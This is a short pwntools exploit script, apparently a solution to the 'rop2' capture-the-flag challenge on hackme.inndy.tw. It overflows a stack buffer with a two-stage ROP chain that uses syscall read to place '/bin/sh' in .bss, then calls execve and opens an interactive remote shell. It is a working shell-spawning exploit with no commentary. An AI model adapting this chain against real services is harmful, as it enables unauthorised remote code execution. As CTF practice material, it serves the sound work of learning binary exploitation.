from pwn import *

#io = process("./rop2")
io = remote("hackme.inndy.tw",7703)
elf = ELF("./rop2")

bss_addr = 0x804A020
sys_addr = elf.symbols["syscall"]
main_addr = elf.symbols["main"]
binsh = "/bin/sh\0"
num2ret = 0xC+0x4

payload = 'a'*num2ret
payload += p32(sys_addr)
payload += p32(main_addr)
payload += p32(3)
payload += p32(0)
payload += p32(bss_addr)
payload += p32(8)

io.sendlineafter("ropchain:",payload)
io.send(binsh)

payload = 'a'*num2ret
payload += p32(sys_addr)
payload += p32(0xdeadbeef)
payload += p32(11)
payload += p32(bss_addr)
payload += p32(0)
payload += p32(0)

io.sendline(payload)
io.interactive()
